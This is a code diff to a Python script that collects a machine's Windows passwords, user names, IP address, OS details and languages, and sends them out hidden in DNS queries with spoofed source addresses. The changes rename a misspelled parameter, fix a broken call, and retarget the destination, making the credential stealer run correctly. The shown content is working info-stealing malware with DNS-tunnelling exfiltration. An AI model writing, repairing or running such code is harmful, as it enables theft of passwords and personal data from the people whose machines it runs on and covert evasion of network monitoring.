@@ -19,21 +19,21 @@ def randInt():
     x = randint(1000, 8999)
     return x
 
-def send_DNS_data(data,encrypte):
+def send_DNS_data(data,encrypt):
     # first, encode the data
-    queries = encode_data(data,encrypte)
+    queries = encode_data(data,encrypt)
     # build the dns packet, by hidding the data
     for query in queries:
-        dns_request = IP(src= randomIP(),dst='172.0.0.1') / UDP(dport=53) / DNS(rd=50, qd=query)
+        dns_request = IP(src= randomIP(),dst='127.0.0.1') / UDP(dport=53) / DNS(rd=50, qd=query)
         send(dns_request, verbose=0)
 
-def encode_data(data,encrypte):
+def encode_data(data,encrypt):
     queries = []
     max_label_length = 63  # Maximum length of a DNS label
 
     # Encode the data and split it into chunks that fit within a DNS label
     encoded_data = data
-    if encrypte:
+    if encrypt:
         encoded_data = b32encode(data.encode('utf-8'))
     chunks = [encoded_data[i:i + max_label_length] for i in range(0, len(encoded_data), max_label_length)]
 
@@ -81,7 +81,7 @@ def getWindowsPasswords():
     return passwords
 
 
-def get_details(encrypte):
+def get_details(encrypt):
     # Current username
     current_username = getpass.getuser()
 
@@ -125,16 +125,16 @@ def get_details(encrypte):
     
     # send the data in DNS protocol
     for password in passwords:
-        send_DNS_data(password.encrypte)
+        send_DNS_data(password, encrypt)
     for password in encryptedPasswords:
-        send_DNS_data(password['user name'],encrypte)
-        send_DNS_data(password['encrypted password'],encrypte)
-    send_DNS_data(current_username,encrypte)
-    send_DNS_data(ip_address,encrypte)
+        send_DNS_data(password['user name'],encrypt)
+        send_DNS_data(password['encrypted password'],encrypt)
+    send_DNS_data(current_username,encrypt)
+    send_DNS_data(ip_address,encrypt)
     for language in available_languages:
-        send_DNS_data(language,encrypte)
-    send_DNS_data(os_name,encrypte)
-    send_DNS_data(os_version,encrypte)
+        send_DNS_data(language,encrypt)
+    send_DNS_data(os_name,encrypt)
+    send_DNS_data(os_version,encrypt)
             
             
 get_details(False)
